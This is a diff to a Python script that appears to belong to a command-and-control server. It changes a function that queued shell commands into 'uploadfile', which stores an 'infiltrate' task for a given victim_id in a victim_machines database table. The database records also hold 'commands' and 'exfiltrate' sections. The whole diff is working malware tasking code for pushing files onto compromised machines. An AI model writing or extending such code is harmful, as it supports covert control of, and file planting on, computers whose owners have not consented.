@@ -20,10 +20,11 @@ def encode ( input ):
 	encoded_updated = updated_bytes.decode('ascii')
 	return encoded_updated
 
-def editcommand( id, command ):
+def uploadfile( id, file_path, file_name ):
+	#FILE_PATH IS WHERE THE FILE IS LOCALLY, FILE_NAME IS THE REMOTE FILE PATH TO STORE IT
 
 	#base query to check whether or not the id requested appears in the database
-	query = """ SELECT command, command_output FROM victim_machines WHERE victim_id =%s """
+	query = """ SELECT command, file_names FROM victim_machines WHERE victim_id =%s """
 	data = (id,)
 
 	#https://www.mysqltutorial.org/python-mysql-update/
@@ -45,33 +46,47 @@ def editcommand( id, command ):
 
 			json_data = json.loads(decoded_command)
 			seconds_from_epoch = int(time.time())
-			new_command = {str(seconds_from_epoch): command}
-			json_data["commands"].update(new_command)
+			new_command = {str(seconds_from_epoch): file_name}
+			json_data["infiltrate"].update(new_command)
 #			print(json.dumps(json_data))
 
 			json_string = str(json.dumps(json_data))
 			encoded_updated = encode(json_string)
 
+			#add the epoch and custom file name to the table for future use
+			decoded_filenames = decode(result[0][1])
+			filename_data = json.loads(decoded_filenames)
+			new_filename = {str(seconds_from_epoch): file_path}
+			filename_data.update(new_filename)
+			print(json.dumps(filename_data))
+
+			#encode the custom filename to be added to the database
+			json_file = str(json.dumps(filename_data))
+			filename_updated = encode(json_file)
+
 			#update the database if the row already exists
-			update_query = """ UPDATE victim_machines SET command=%s WHERE victim_id=%s """
-			update_data = (encoded_updated, id)
-			command_record_query = """ UPDATE victim_machines SET command_record=%s WHERE victim_id=%s """
+			update_query = """ UPDATE victim_machines SET command=%s, command_record=%s WHERE victim_id=%s """
+			update_data = (encoded_updated, encoded_updated, id)
+			command_record_query = """ UPDATE victim_machines SET file_names=%s WHERE victim_id=%s """
+			update_file_data = (filename_updated, id)
 
 			cursor.execute(update_query, update_data)
-			cursor.execute(command_record_query, update_data)
+			cursor.execute(command_record_query, update_file_data)
 
 		#catch the case in which the victim_id does not exist in the table and create a new entry
 		else:
 			print("id not found in the database")
 			print("creating new entry in database...")
 			seconds_from_epoch = int(time.time())
-			empty_json = "e30="
+			empty_command_output = "e30="
 			default_group_id = 1
-			formatted_command = "{\"commands\": {\"" + str(seconds_from_epoch) + "\": \"" + command + "\"}, \"exfiltrate\": {}, \"infiltrate\": {}}"
+			formatted_command = "{\"commands\": {}, \"exfiltrate\":{}, \"infiltrate\": {\"" + str(seconds_from_epoch) + "\": \"" + file_name + "\"}}"
 			formatted_encoded = encode(formatted_command)
+			custom_filename = "{\"" + str(seconds_from_epoch) + "\": \"" + file_path + "\"}"
+			encoded_custom_filename = encode(custom_filename)
 
 			create_query = """ INSERT INTO victim_machines (victim_id, group_id, command, command_output, command_record, file_names) VALUES (%s, %s, %s, %s, %s, %s) """
-			create_data = (id, default_group_id, formatted_encoded,empty_json, formatted_encoded, empty_json)
+			create_data = (id, default_group_id, formatted_encoded,empty_command_output, formatted_encoded, encoded_custom_filename)
 
 			cursor.execute(create_query, create_data)
 
@@ -87,4 +102,4 @@ def editcommand( id, command ):
 	return True
 
 if __name__ == "__main__":
-	editcommand(*sys.argv[1:])
+	uploadfile(*sys.argv[1:])
